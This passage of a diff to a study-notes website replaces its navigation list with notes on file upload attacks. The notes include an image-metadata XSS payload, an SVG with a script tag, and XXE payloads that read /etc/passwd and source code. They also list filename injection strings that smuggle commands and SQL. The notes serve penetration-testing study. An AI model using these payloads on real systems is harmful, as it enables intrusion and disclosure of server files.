+</span><span id="__span-0-6"><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$ext$char</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-7"><span class="w">    </span><span class="k">done</span>
+</span><span id="__span-0-8"><span class="k">done</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="limiting-content-type-wordlist-example">Limiting Content-Type wordlist example</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">wget<span class="w"> </span>https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+</span><span id="__span-1-2">cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>image-content-types.txt<span class="w"> </span><span class="c1"># method 1</span>
+</span><span id="__span-1-3">cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xclip<span class="w"> </span>-se<span class="w"> </span>c<span class="w"> </span><span class="c1"># method 2</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="limited-uploads">Limited Uploads</h2>
 <ul>
-<li><a href="study-notes/owasp-top-10-2025/">OWASP Top 10 2025</a></li>
-<li><a href="study-notes/reconnaissance/">Reconnaissance</a></li>
-<li><a href="study-notes/reporting-and-poc/">Reporting &amp; POC</a></li>
-<li><a href="study-notes/tech-interview-prep/">Tech Interview Prep</a></li>
+<li>Secure filters not exploitable with above techniques</li>
+<li>Fuzz file extensions to try below techniques</li>
 </ul>
-<h3 id="bscp-study-notes">BSCP Study Notes</h3>
+<table>
+<thead>
+<tr>
+<th>Potential Attack</th>
+<th>File Types</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSS</td>
+<td>HTML, JS, SVG, GIF</td>
+</tr>
+<tr>
+<td>XXE/SSRF</td>
+<td>XML, SVG, PDF, PPT, DOC</td>
+</tr>
+<tr>
+<td>DoS</td>
+<td>ZIP, JPG, PNG</td>
+</tr>
+</tbody>
+</table>
+<h3 id="xss">XSS</h3>
 <ul>
-<li><a href="study-notes/bscp-study-notes/">Overview</a></li>
-<li><a href="study-notes/bscp-study-notes/authentication-vulnerabilities/">Authentication Vulnerabilities</a></li>
-<li><a href="study-notes/bscp-study-notes/business-logic-vulnerabilities/">Business Logic Vulnerabilities</a></li>
-<li><a href="study-notes/bscp-study-notes/command-injection/">Command Injection</a></li>
-<li><a href="study-notes/bscp-study-notes/cross-site-scripting/">Cross-Site Scripting</a></li>
-<li><a href="study-notes/bscp-study-notes/path-traversal/">Path Traversal</a></li>
-<li><a href="study-notes/bscp-study-notes/sql-injection/">SQL Injection</a></li>
+<li>Adding XSS payload to an image's metadata:</li>
 </ul>
-<h3 id="cwee-study-notes">CWEE Study Notes</h3>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s1">&#39; &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39;</span><span class="w"> </span>HTB.jpg
+</span><span id="__span-2-2">exiftool<span class="w"> </span>HTB.jpg
+</span></code></pre></div></td></tr></table></div>
 <ul>
-<li><a href="study-notes/cwee-study-notes/">Overview</a></li>
-<li><a href="study-notes/cwee-study-notes/attacking-authentication-mechanisms/">Attacking Authentication Mechanisms</a></li>
-<li><a href="study-notes/cwee-study-notes/injection-attacks/">Injection Attacks</a></li>
-<li><a href="study-notes/cwee-study-notes/introduction-to-nosql-injection/">Introduction to NoSQL Injection</a></li>
-<li><a href="study-notes/cwee-study-notes/intro-to-whitebox-pentesting/">Intro to Whitebox Pentesting</a></li>
+<li>Change the image's MIME-Type to text/html, web apps may show it as an HTML document instead of an image, thus the XSS payload would be triggered.</li>
+<li>Scalable Vector Graphics (SVG) images are XML-based. For this reason, we can modify their XML data to include an XSS payload: </li>
 </ul>
-<h3 id="cwes-study-notes">CWES Study Notes</h3>
+<div class="language-xml highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">XML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-3-2"><span class="cp">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span>
+</span><span id="__span-3-3"><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-3-4"><span class="w">    </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">fill=</span><span class="s">&quot;green&quot;</span><span class="w"> </span><span class="na">stroke=</span><span class="s">&quot;black&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-3-5"><span class="w">    </span><span class="nt">&lt;script</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>alert(window.origin);<span class="nt">&lt;/script&gt;</span>
+</span><span id="__span-3-6"><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="xxe">XXE</h3>
 <ul>
-<li><a href="study-notes/cwes-study-notes/api-attacks/">API Attacks</a></li>
-<li><a href="study-notes/cwes-study-notes/attacking-common-applications/">Attacking Common Applications</a></li>
-<li><a href="study-notes/cwes-study-notes/attacking-graphql/">Attacking GraphQL</a></li>
-<li><a href="study-notes/cwes-study-notes/attacking-web-applications-with-ffuf/">Attacking Web Applications with Ffuf</a></li>
-<li><a href="study-notes/cwes-study-notes/broken-authentication/">Broken Authentication</a></li>
-<li><a href="study-notes/cwes-study-notes/command-injections/">Command Injections</a></li>
-<li><a href="study-notes/cwes-study-notes/cross-site-scripting-%28xss%29/">Cross-Site Scripting (XSS)</a></li>
-<li><a href="study-notes/cwes-study-notes/file-inclusion/">File Inclusion</a></li>
-<li><a href="study-notes/cwes-study-notes/file-upload-attacks/">File Upload Attacks</a></li>
-<li><a href="study-notes/cwes-study-notes/hacking-wordpress/">Hacking WordPress</a></li>
-<li><a href="study-notes/cwes-study-notes/javascript-deobfuscation/">JavaScript Deobfuscation</a></li>
-<li><a href="study-notes/cwes-study-notes/login-brute-forcing/">Login Brute Forcing</a></li>
-<li><a href="study-notes/cwes-study-notes/server-side-attacks/">Server-Side Attacks</a></li>
-<li><a href="study-notes/cwes-study-notes/session-security/">Session Security</a></li>
-<li><a href="study-notes/cwes-study-notes/sql-injection-fundamentals/">SQL Injection Fundamentals</a></li>
-<li><a href="study-notes/cwes-study-notes/sqlmap-essentials/">SQLMap Essentials</a></li>
-<li><a href="study-notes/cwes-study-notes/web-attacks/">Web Attacks</a></li>
-<li><a href="study-notes/cwes-study-notes/web-fuzzing/">Web Fuzzing</a></li>
-<li><a href="study-notes/cwes-study-notes/web-service-and-api-attacks/">Web Service &amp; API Attacks</a></li>
+<li>SVG/XML example:</li>
 </ul>
-<h3 id="android-application-pentesting">Android Application Pentesting</h3>
+<div class="language-xml highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">XML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-4-2"><span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-4-3"><span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
-<li><a href="study-notes/android-application-pentesting/">Overview</a></li>
-<li><a href="study-notes/android-application-pentesting/android-fundamentals/">Android Fundamentals</a></li>
-<li><a href="study-notes/android-application-pentesting/android-application-static-analysis/">Android Application Static Analysis</a></li>
-<li><a href="study-notes/android-application-pentesting/android-application-dynamic-analysis/">Android Application Dynamic Analysis</a></li>
+<li>Another example but to read the web apps source code:</li>
 </ul>
-<h3 id="tools-and-protocols">Tools and Protocols</h3>
+<div class="language-xml highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">XML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-5-2"><span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-5-3"><span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
-<li><a href="study-notes/tools-and-protocols/curl/">cURL</a></li>
-<li><a href="study-notes/tools-and-protocols/ftp/">ftp</a></li>
-<li><a href="study-notes/tools-and-protocols/gobuster/">gobuster</a></li>
-<li><a href="study-notes/tools-and-protocols/nmap/">nmap</a></li>
+<li>View page source of the upload page to see the returned file from above payload.</li>
+<li>PDF, Word Documents, PowerPoint Documents all include XML elements.</li>
 </ul>
+<h2 id="other-upload-attacks">Other Upload Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Attack Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Injections in File Name</td>
+<td>When file name is displayed on page (reflected) e.g. <code>file$(whoami).jpg</code>, <code>file`whoami`.jpg</code>, <code>file.jpg\|\|whoami</code>, <code>&lt;script&gt;alert(window.origin);&lt;/script&gt;.jpeg</code>,    <code>file';select+sleep(5);--.jpg</code></td>
+</tr>
+<tr>
+<td>Upload Directory Disclosure</td>
+<td>When no access to the link or uploaded file, use other methods to find the uploads directory i.e. fuzzing, LFI, XXE, forcing error messages (upload file with a name that already exists/extremely long name)</td>
+</tr>
+<tr>
+<td>Windows-specific Attacks</td>
+<td>Using reserved characters (</td>
+</tr>
+</tbody>
+</table>
 
 
 
@@ -2207,10 +2428,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["content.code.copy"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
